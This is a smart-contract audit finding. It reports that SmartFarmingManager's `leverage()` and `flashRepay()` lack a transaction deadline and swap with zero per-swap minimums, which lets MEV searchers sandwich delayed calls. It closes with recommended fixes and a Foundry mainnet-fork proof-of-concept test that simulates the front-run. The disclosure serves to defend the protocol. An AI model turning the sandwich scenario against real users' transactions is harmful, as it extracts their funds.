### Title
Missing transaction expiry allows delayed `leverage()` calls to be sandwiched within stale slippage bounds - (File: `contracts/SmartFarmingManager.sol`)

### Summary

`SmartFarmingManager.leverage()` accepts only `depositAmountMin_` as execution protection and has no deadline or expiry parameter. A block producer or MEV searcher can hold a valid transaction, move the venue used by the configured `Swapper`, and later execute the transaction while the result remains above the stale `depositAmountMin_`. The internal swaps are explicitly performed with `amountOutMin_ = 0`, so the only protection is the final deposit amount and post-transaction health check. [1](#0-0) 

### Finding Description

The public `leverage()` entry point has no timestamp bound and permits any leverage above `1x` up to the collateral-factor limit. [2](#0-1) 

If the input token is not already collateral, it is first swapped through the configured `Swapper` with `amountOutMin_ = 0`. [3](#0-2) 

The function then flash-mints synthetic tokens, mints debt to the caller, and swaps the synthetic tokens for collateral, again with `amountOutMin_ = 0`. [4](#0-3) 

The delegated swap call passes that zero minimum directly to `swapper_.swapExactInput()`, leaving the external venue execution entirely unprotected at the individual swap level. [5](#0-4) 

Because `depositAmountMin_` is fixed when the transaction is signed, it protects only against absolute worst-case output at the eventual execution state, not against stale market conditions or maximum-extractable slippage after the transaction is withheld. [6](#0-5) 

The same expiry omission exists in `flashRepay()`: it withdraws collateral, swaps through the external `Swapper`, and accepts any output above a signed static `swapAmountOutMin_`. [7](#0-6) 

### Impact Explanation

An unprivileged searcher can hold the victim's `leverage()` transaction, trade in the same direction as the victim's synthetic-token-to-collateral swap, include the victim transaction while its output is still just above `depositAmountMin_`, and back-run the venue afterward.

The victim receives less collateral than intended while still incurring the debt amount calculated before the swap. The final `debtPositionOf()` check only ensures that the resulting position is solvent; it does not restore the intended exchange rate or refund value extracted by the sandwich. [8](#0-7) 

For example, if the expected swap output is `100` collateral units and the signed `depositAmountMin_` permits `95`, an attacker can move the execution price so that the swap returns only `95`; the victim's deposit and health checks still pass while the `5`-unit spread is captured by the attacker. [9](#0-8) 

### Likelihood Explanation

The function is externally callable, subject only to shutdown, reentrancy, and valid Metronome asset checks; none of those checks limit how old the signed transaction is or the market state in which it executes. [10](#0-9) 

The attacker needs only ordinary ability to trade the external venue used by `Swapper`, or equivalent inventory/flash liquidity in the synthetic asset and collateral. `nonReentrant` does not prevent cross-transaction reordering, and `onlyIfDepositTokenExists`/`onlyIfSyntheticTokenExists` merely restrict the function to configured assets. [11](#0-10) 

This is most exploitable for transactions routed through liquidity-sensitive venues and for users who leave practical slippage tolerance rather than setting an exact-output bound.

### Recommendation

Add a caller-supplied `deadline` to `leverage()` and `flashRepay()` and revert before any state-changing operation when `block.timestamp > deadline`.

Update `ISmartFarmingManager` accordingly. Preferably extend the swap execution interface or calldata so the same deadline reaches the external swap venue; otherwise validate the deadline in `SmartFarmingManager` before each swap and transaction-finalization step.

Consider adding separate minimum-output bounds for each intermediate swap, or derive tight execution-time bounds from the oracle quote. `depositAmountMin_` should remain as a final accounting check, but it should not be the only constraint on delayed execution. [12](#0-11) 

### Proof of Concept

The following Foundry fork test models a held transaction by moving the relevant `SYNTH -> COLLATERAL` venue before executing the previously constructed victim call. `POOL`, `SFM`, `MSD_COLLATERAL`, `SYNTH`, `COLLATERAL`, and `SYNTH_WHALE` are loaded from the target fork; the attacker may alternatively obtain `SYNTH` through public issuance or a flash loan.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IPool} from "contracts/interfaces/IPool.sol";
import {IDebtToken} from "contracts/interfaces/IDebtToken.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";
import {ISyntheticToken} from "contracts/interfaces/ISyntheticToken.sol";
import {ISmartFarmingManager} from "contracts/interfaces/ISmartFarmingManager.sol";
import {IMasterOracle} from "contracts/interfaces/external/IMasterOracle.sol";

interface IVenue {
    function swapSyntheticForCollateral(
        address synthetic,
        address collateral,
        uint256 amountIn
    ) external;
}

contract LeverageMissingExpiryTest is Test {
    function testHeldLeverageIsSandwichedAtExecutionTime() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        IPool pool = IPool(vm.envAddress("POOL"));
        ISmartFarmingManager sfm =
            ISmartFarmingManager(vm.envAddress("SMART_FARMING_MANAGER"));
        IDepositToken msdCollateral =
            IDepositToken(vm.envAddress("MSD_COLLATERAL"));
        ISyntheticToken synth =
            ISyntheticToken(vm.envAddress("SYNTHETIC_TOKEN"));
        IERC20 collateral =
            IERC20(address(msdCollateral.underlying()));
        IVenue venue = IVenue(vm.envAddress("DEX_VENUE"));

        address victim = vm.envAddress("VICTIM");
        address attacker = vm.envAddress("ATTACKER");
        address synthWhale = vm.envAddress("SYNTH_WHALE");

        uint256 amountIn = 100 ether;
        uint256 leverage = 2e18;

        // This matches SmartFarmingManager's oracle-derived debt sizing.
        IMasterOracle oracle = pool.masterOracle();
        uint256 debtAmount =
            oracle.quote(address(collateral), address(synth), amountIn);
        (uint256 baselineIssued,) =
            pool.debtTokenOf(synth).quoteIssueOut(debtAmount);

        // Baseline expected collateral output before the transaction is held.
        // _venueQuote abstracts the same venue used by the configured Swapper.
        uint256 baselineOut =
            _venueQuote(venue, address(synth), address(collateral), baselineIssued);

        // Victim accepts 5% total slippage relative to the expected final deposit.
        uint256 depositAmountMin =
            amountIn + (baselineOut * 95) / 100;

        // Searcher obtains synthetic tokens and moves the venue in the victim's
        // swap direction. This represents front-running a transaction withheld
        // from inclusion.
        uint256 sandwichIn = baselineIssued / 4;
        vm.prank(synthWhale);
        synth.transfer(attacker, sandwichIn);

        vm.startPrank(attacker);
        synth.approve(address(venue), sandwichIn);
        venue.swapSyntheticForCollateral(
            address(synth),
            address(collateral),
            sandwichIn
        );
        vm.stopPrank();

        // The old transaction is still valid because leverage() has no expiry.
        vm.startPrank(victim);
        collateral.approve(address(sfm), amountIn);
        (uint256 deposited,) = sfm.leverage(
            IERC20(address(0)),
            msdCollateral,
            synth,
            amountIn,
            leverage,
            depositAmountMin
        );
        vm.stopPrank();

        // The transaction succeeds at the stale lower bound.
        assertGe(deposited, depositAmountMin);
        assertLt(deposited, amountIn + baselineOut);

        // The victim now has lower collateral for the same oracle-sized debt.
        uint256 victimDebt = pool.debtTokenOf(synth).balanceOf(victim);
        assertEq(victimDebt, debtAmount);
    }

    function _venueQuote(
        IVenue,
        address,
        address,
        uint256 amountIn
    ) internal pure returns (uint256) {
        // Replace with the actual view quote exposed by the forked venue used
        // by the configured PoolRegistry.swapper().
        return amountIn;
    }
}
```

The critical assertion is that the delayed transaction still succeeds after the venue has moved because there is no timestamp check. The external swaps then execute with zero per-swap minimum output, while the fixed `depositAmountMin_` permits the attacker to capture any value above that stale bound without making the victim's final position unhealthy. [13](#0-12)
